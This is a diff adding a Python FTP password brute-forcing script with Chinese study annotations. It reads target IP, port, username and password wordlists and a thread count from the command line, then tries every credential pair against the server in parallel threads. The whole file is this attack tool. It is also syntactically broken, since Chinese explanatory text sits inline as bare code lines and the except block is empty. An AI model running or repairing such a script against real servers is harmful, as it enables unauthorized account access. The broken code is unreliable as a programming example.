@@ -1,0 +1,57 @@
+import ftplib  定义了FTP类
+import sys    定义系统函数
+#使用以下两个包，多线程
+import threading
+import queue   提供了一个适用于多线程的进出的结构
+import time
+让用户可以输入用户名和密码，ip和port
+# 模拟爆破，需要知道ip，port，用户名，密码字典    
+def ftp_brute(ip,port):
+函数计时开始  i = time.time()
+创建ftp对象   ftp = ftplib.FTP()
+连接ftp服务器 ftp.connect(ip,int(port))
+   q.empty，创建一个数组，表示q中为空，q列表为非空时执行循环。 
+    while not q.empty():
+        #将队列q中的数据取出。
+        dict = q.get()
+
+        #从队列中取出的数据是字符串，将每次从队列中取出的数据用 | 进行分割，分割后的数据类型是列表，而不是字符串！！！
+        dict = dict.split('|')
+        username = dict[0]
+        passwd = dict[1]
+        try:
+        #登录账号密码
+            ftp.login(username,passwd)
+            # print(ftp.retrlines('list'))
+            # print(username+' '+passwd+' ok')
+        except ftplib.all_errors:
+            # print(username+' '+passwd+'password 错误')
+    j = time.time()
+    print(j-i)
+
+    # #主函数
+if __name__ == '__main__':
+
+    #通过sys包进行参数获取
+Sys.argv[ ]其实就是一个列表，里边的项为用户输入的参数
+    ip = sys.argv[1]
+    port = sys.argv[2]
+    userfile = sys.argv[3]
+    passwdfile = sys.argv[4]
+    thread = sys.argv[5]
+    #通过打印输入结果，查看获取的参数是否有问题
+    #print(ip+port+userfile+passwdfile)
+
+    #创建queue队列
+    q = queue.Queue()
+    for username in open(userfile):   遍历用户名字典
+        for passwd in open(passwdfile):
+            username = username.replace('\n','')
+            passwd = passwd.replace('\n','')
+            #将每次循环中的username和passwd存到队列q中。
+            q.put(username+'|'+passwd)
+
+    #使用多线程执行函数
+    for x in range(int(thread)):
+        t = threading.Thread(target=ftp_brute,args=(ip,int(port)))
+        t.start()
